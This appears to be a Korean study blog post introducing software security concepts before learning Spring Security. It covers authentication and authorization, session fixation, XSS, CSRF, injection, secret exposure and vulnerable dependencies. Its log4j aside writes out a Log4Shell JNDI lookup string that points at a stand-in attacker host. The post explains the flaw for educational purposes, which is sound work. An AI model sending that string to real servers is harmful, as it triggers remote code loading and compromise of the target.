# Spring Security In Action

## 들어가며

훌륭한 애플리케이션을 개발하기 위해서는 비즈니스 문제를 명확히 해결하는 것뿐만 아니라, 애플리케이션이 원활히 동작하도록 도와주는 비기능적인 부분도 관심과 고려가 있어야 한다고 생각한다.

이런 비기능적인 측면 중 하나인 보안은 대부분의 애플리케이션에서 심도 있게 고려해야 할 부분이다.

스프링을 통해 개발한다면 스프링답게 보안처리를 도와주는 스프링 시큐리티라는 프레임워크가 있다.

이번 기회에 스프링 시큐리티 프레임워크에 대해 좀 더 깊게 알아가면서, 보안에 대해 좀 더 관심을 가지고, 안전한 애플리케이션을 만들 수 있도록 성장하고자 한다.

이번 글에서는 본격적으로 스프링 시큐리티를 알아보기 앞서 대략적인 보안 개념과 일반적으로 무엇으로부터 보호해야 할지에 대해 알아보려 한다.

\


## 소프트웨어 보안

현대의 소프트웨어는 민감한 정보를 데이터로 관리하기 때문에 애플리케이션은 그 정보가 의도되지 않은 사용자에게 접근되거나 변경 또는 가로채지 않게 처리해야 한다. 이것이 광범위하게 표현한 보안의 의미이다.

개인적으로 보안을 표현하기도 쉽고 개념적으로 가장 중요하다고 생각되는 것은 인증과 인가이다.

인증은 애플리케이션을 사용하려는 주체를 식별하는 프로세스를 뜻하며, 인가는 인증된 주체에게 어떤 기능이나 데이터에 권한이 있는지 체크하는 프로세스이다.

소프트웨어에서 보안은 가장 최상층인 애플리케이션 계층뿐 아니라 가상머신이나 네트워크 같은 하위계층에도 적용되고 신경 써야 한다. 우리가 알아볼 스프링 시큐리티는 애플리케이션 계층에서의 보안이다.

\


## 보안의 중요성

실제 개인정보가 유출되는 사례는 대중적으로도 이미 많이 알려져 있다. 보안에 대한 미비한 투자로 직접적인 금전적인 비용 손실, 브랜드의 이미지 실추, 심하게는 인명 피해까지 이어질 수 있다. 때문에 보안은 프로젝트 시작부터 고려해야 할 중요한 사항이다. 보안의 취약성을 예방하는 것이 공격받은 후 대처하는 것보다 비용이 적게 드는 것은 당연하다.

> 사실 보안 처리를 했다고 해도 모든 공격을 막아낼 순 없다. 만일 피해를 받은 상황에 대한 대응도 미리 준비해 피해를 최소화할 수 있는 것이 중요할 것 같다.\
>

## 일반적인 보안 취약성

공격자는 무턱대고 공격하기보단 취약성을 파악하고 집중 공격한다. 때문에 일반적으로 공격자가 어떤 취약성을 이용해 공격하는지 알고 있어야 한다.&#x20;



* 인증, 인가 취약성

의도되지 않은 사용자가 악의를 가지고 다른 사람의 기능이나 민감한 정보에 접근할 수 있다.

* 세션 고정

공격자가 이미 생성된 세션 ID를 재이용해서 유효한 사용자를 가장할 수 있다.

이 취약점은 기존 발급한 세션 ID가 고유하지 않거나 유효시간을 주지 않을 때 발생한다.

> 세션이란 각 클라이언트(브라우저)와의 연결을 구별하기 위해 서버에 상태를 저장하는 기술이다.



* XSS(교차 사이트 스크립팅 Cross Site Scripting)

공격자가 클라이언트 쪽에 악의적인 스크립트를 주입하면 서버가 이를 실행하게 되어 피해를 받을 수 있다.

XSS을 방어하는 방법의 핵심은 서버가 검증되지 않은 html 문자열을 그대로 사용하는 것이라고 생각한다. 서버가 브라우저에게 악의적인 script가 포함되어 있는 문자열을 전달하면 브라우저는 이를 실행하게 되어 문제를 일으킨다.

아래 링크의 문제를 풀면서 어떤 방식으로 공격하는지 이해해 보자.

[XSS game](https://xss-game.appspot.com/level1)



* CSRF(사이트 간 요청 위조)

어떤 유저가 공격할 사이트에 로그인된 상태에서 악성 스크립트가 포함된 페이지에 접속하도록 유도한다. 악성 스크립트는 로그인 정보가 있는 쿠키를 이용해 서버에 요청하기 때문에, 서버는 공격자의 요청을 정상적인 요청으로 인식하고 수행하게 된다.



* Injection

주입 공격은 광범위한 공격으로 앞서 말한 XSS, Xpath 주입, SQL 주입이 있다. SQL주입은 가장 오래되고 잘 알려진 주입 취약성으로 공격자는 다른 SQL 쿼리를 애플리케이션에 주입시키고 실행시키는 공격방법이다.



* 기밀 데이터 노출

가장 기초적이지만 흔한 실수 중 하나다. 중요한 데이터를 실제 소스코드에 입력한다면 코드를 볼 수 있는 모든 사람에게 노출이 되며, 버전관리에서는 변경 기록까지 남게 된다. 민감 데이터를 로그 남기거나 콘솔을 찍는 행위도 이에 해당한다. 에러 메시지 정보에 너무 많은 정보를 전달하는 것도 공격자에게 큰 힌트가 될 수 있으니 주의해야 한다.



* 취약성이 있는 종속성 이용

log4j 사태처럼 라이브러리나 프레임워크 같은 종속성 자체에 취약성이 있을 수 있다.

<details>

<summary>log4j 사태</summary>

Log4j는 자바 기반 로깅 라이브러리이다. java에는 JNDI라는 디렉터리를 통해 데이터를 찾을 수 있는 디렉터리 서비스가 있으며, 인터페이스 중 하나인 LDAP가 있다. 문제는 log4j가 특정 형식으로 로그를 남길 때도 JNDI를 수행할 수 있기 때문에 발생한다.

공격자는 타겟 서버 header에 ${jndi:ldap://attaker-server.com/a}의 문자열을 남기면, 타겟 서버는 로그 출력이 아니라 공격자 서버에 존재하는 자바 클래스 파일을 요청하고 실행하게 된다.

<img src="https://blog.kakaocdn.net/dn/caIrXV/btrWUHpXcS2/3Rw1slOH37ULc82r4gEwJK/img.png" alt="" data-size="original">



</details>

&#x20;

\


> [OWASP](https://owasp.org/)\
> 애플리케이션 개발 중 가장 일반적인 취약성을 소개하니 참고해 보자.

<figure><img src="https://blog.kakaocdn.net/dn/b4JRLO/btrWYMjJt7a/pev4UHZakksMm0KG7UBaf1/img.png" alt=""><figcaption></figcaption></figure>
